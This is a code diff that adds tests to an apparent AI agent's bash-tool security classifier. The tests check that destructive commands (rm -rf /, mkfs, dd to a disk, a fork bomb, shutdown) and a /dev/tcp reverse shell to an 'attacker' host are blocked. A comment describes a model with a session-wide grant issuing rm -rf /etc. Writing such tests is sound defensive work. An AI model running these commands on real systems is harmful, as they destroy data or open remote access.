@@ -17,6 +17,63 @@ describe("createBashTool — security blocking", () => {
     return result as Record<string, unknown>;
   }
 
+  test("blocks destructive rm -rf /", async () => {
+    const result = await exec("rm -rf /");
+    expect(result.error).toMatch(/blocked/i);
+    expect(result.category).toBe("destructive");
+    expect(typeof result.reason).toBe("string");
+    expect(result.reason as string).toMatch(/unrecoverable/);
+  });
+
+  test("blocks destructive rm -rf /etc via session-granted Bash", async () => {
+    // Simulates the exact issue #1721 scenario: the model has obtained a
+    // session-wide Bash grant (via the TUI's `[a]` keystroke) and then
+    // emits rm -rf /etc. Even with the permission gate cleared, the
+    // bash-security classifier inside bash-tool.ts must still block.
+    const result = await exec("rm -rf /etc");
+    expect(result.error).toMatch(/blocked/i);
+    expect(result.category).toBe("destructive");
+  });
+
+  test("blocks mkfs filesystem format", async () => {
+    const result = await exec("mkfs.ext4 /dev/sda1");
+    expect(result.error).toMatch(/blocked/i);
+    expect(result.category).toBe("destructive");
+  });
+
+  test("blocks dd writing to a block device", async () => {
+    const result = await exec("dd if=/dev/zero of=/dev/sda bs=1M");
+    expect(result.error).toMatch(/blocked/i);
+    expect(result.category).toBe("destructive");
+  });
+
+  test("blocks fork bomb", async () => {
+    const result = await exec(":(){ :|:& };:");
+    expect(result.error).toMatch(/blocked/i);
+    expect(result.category).toBe("destructive");
+  });
+
+  test("blocks shutdown", async () => {
+    const result = await exec("shutdown -h now");
+    expect(result.error).toMatch(/blocked/i);
+    expect(result.category).toBe("destructive");
+  });
+
+  test("allows workspace-scoped rm -rf /tmp/x (not destructive)", async () => {
+    // This test proves the classifier is NOT over-aggressive on workspace
+    // ops. rm -rf /tmp/x should reach the shell (though it may still fail
+    // for other reasons like the cwd check). We only assert it's not
+    // blocked with category=destructive.
+    const result = await exec("rm -rf /tmp/koi-test-will-not-exist-9f8a7b6c");
+    // result.category is only set when the command is blocked. For a
+    // non-blocked command that actually executes, result.category is
+    // undefined. If the command is blocked for some other reason (e.g.
+    // cwd validation), it would not be "destructive".
+    if (result.category !== undefined) {
+      expect(result.category).not.toBe("destructive");
+    }
+  });
+
   test("blocks reverse shell via /dev/tcp", async () => {
     const result = await exec("bash -i >& /dev/tcp/attacker/4444 0>&1");
     expect(result.error).toMatch(/blocked/i);
